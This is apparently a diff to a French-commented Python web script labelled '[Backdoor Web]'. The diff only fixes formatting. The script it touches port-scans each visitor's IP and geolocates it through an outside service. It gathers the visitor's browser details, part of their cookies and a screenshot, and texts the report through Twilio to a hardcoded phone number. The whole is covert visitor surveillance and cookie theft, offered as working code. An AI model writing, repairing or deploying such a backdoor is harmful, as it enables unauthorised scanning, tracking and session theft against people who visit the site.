@@ -15,7 +15,6 @@ to_number = os.getenv('+33635960569') or '+33635960569'
 client = Client(account_sid, auth_token)
 
 # Géolocalisation via IP
-
 def get_geolocation(ip):
     try:
         res = requests.get(f"http://ip-api.com/json/{ip}").json()
@@ -24,7 +23,6 @@ def get_geolocation(ip):
         return "Localisation impossible"
 
 # Scan des ports
-
 def scan_ports(ip, ports=[22, 80, 443, 8080]):
     open_ports = []
     for port in ports:
@@ -40,7 +38,6 @@ def scan_ports(ip, ports=[22, 80, 443, 8080]):
     return open_ports
 
 # Envoi SMS Twilio
-
 def send_sms(details):
     try:
         message = client.messages.create(
@@ -111,22 +108,14 @@ def log():
     ports = scan_ports(ip)
 
     details = (
-        f"[Backdoor Web]
-"
-        f"IP : {ip}
-"
-        f"Localisation : {location}
-"
-        f"Ports : {ports if ports else 'Aucun'}
-"
-        f"User-Agent : {user_agent}
-"
-        f"Langue : {lang} | Fuseau : {timezone}
-"
-        f"Resolution : {resolution} | Temps sur la page : {time_spent}s
-"
-        f"Cookies : {cookies[:100]}...
-"
+        f"[Backdoor Web]\n"
+        f"IP : {ip}\n"
+        f"Localisation : {location}\n"
+        f"Ports : {ports if ports else 'Aucun'}\n"
+        f"User-Agent : {user_agent}\n"
+        f"Langue : {lang} | Fuseau : {timezone}\n"
+        f"Resolution : {resolution} | Temps sur la page : {time_spent}s\n"
+        f"Cookies : {cookies[:100]}...\n"
         f"Screenshot : {screenshot}"
     )
 
